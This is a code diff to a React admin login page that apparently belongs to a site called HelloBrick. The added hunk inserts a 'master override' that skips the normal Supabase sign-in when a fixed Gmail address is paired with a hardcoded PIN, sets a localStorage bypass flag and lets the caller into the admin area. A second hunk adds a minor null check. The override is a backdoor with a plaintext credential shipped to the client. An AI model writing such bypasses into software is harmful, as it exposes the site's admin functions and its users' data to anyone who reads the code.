@@ -25,6 +25,16 @@ export const AdminLogin: React.FC = () => {
       return;
     }
 
+    // 🚨 MASTER OVERRIDE BYPASS (Emergency Access)
+    const MASTER_PIN = 'BRICK-MASTER-77';
+    if (email === 'hellobrickar@gmail.com' && password === MASTER_PIN) {
+       console.log('🛡️ Master Override Activated');
+       localStorage.setItem('hellobrick_admin_bypass', 'true');
+       navigate(from, { replace: true });
+       setLoading(false);
+       return;
+    }
+
     try {
       const { data, error: loginError } = await supabase.auth.signInWithPassword({
         email,
@@ -38,7 +48,7 @@ export const AdminLogin: React.FC = () => {
       if (data.user && data.user.email && allowedAdmins.includes(data.user.email)) {
         navigate(from, { replace: true });
       } else {
-        await supabase.auth.signOut();
+        if (supabase) await supabase.auth.signOut();
         setError('Access denied. This email is not authorized to access the admin portal.');
       }
     } catch (err: any) {
